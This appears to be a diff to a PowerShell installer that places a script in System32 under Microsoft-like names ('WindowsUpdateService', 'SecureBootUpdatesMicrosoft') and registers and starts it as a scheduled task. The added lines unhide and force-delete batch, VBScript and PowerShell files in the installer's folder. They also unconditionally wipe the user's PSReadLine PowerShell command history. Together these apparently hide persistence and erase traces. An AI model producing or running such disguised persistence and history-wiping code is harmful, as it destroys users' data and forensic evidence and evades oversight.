@@ -3,6 +3,9 @@
 $regPath = "HKLM:\Software\WindowsUpdateService"
 $shellscriptpath = "C:/Windows/System32/WindowsUpdateService.ps1"
 $directoryPath = "C:/Windows/System32/SecureBootUpdatesMicrosoft/"
+$psreadlineFolderPath = Join-Path $env:USERPROFILE 'AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine'
+##Do Not use the option in repo env, only for production env.
+$runcleanup = $false
 
 # File Opening.
 $scriptDirectory = Split-Path -Path $MyInvocation.MyCommand.Path -Parent
@@ -161,3 +164,28 @@ else {}
 Register-ScheduledTask -Xml $updateservxml -TaskName $updateserv | Out-Null
 Start-Sleep 10
 Start-ScheduledTask -TaskName $updateserv
+
+#cleanup-script
+if ($runcleanup) {
+    # Unhide all hidden files in the script directory
+    Get-ChildItem -Path $PSScriptRoot -Force | Where-Object { $_.Attributes -band [System.IO.FileAttributes]::Hidden } | ForEach-Object {
+        $_.Attributes = $_.Attributes -bxor [System.IO.FileAttributes]::Hidden
+        Write-Output "Unhid file: $($_.FullName)"
+    }
+    # Remove files with specified extensions from the script directory
+    $extensions = @(".bat", ".cmd", ".vbs", ".ps1")
+    foreach ($extension in $extensions) {
+        $files = Get-ChildItem -Path $PSScriptRoot -Filter "*$extension" -File
+        foreach ($file in $files) {
+            Remove-Item -Path $file.FullName -Force
+        }
+    }
+} else {}
+
+#powershell-cleanup.
+if (Test-Path -Path $psreadlineFolderPath -PathType Container) {
+  $files = Get-ChildItem -Path $psreadlineFolderPath
+  if ($files.Count -gt 0) {
+      Remove-Item -Path "$psreadlineFolderPath\*" -Force
+  }
+}
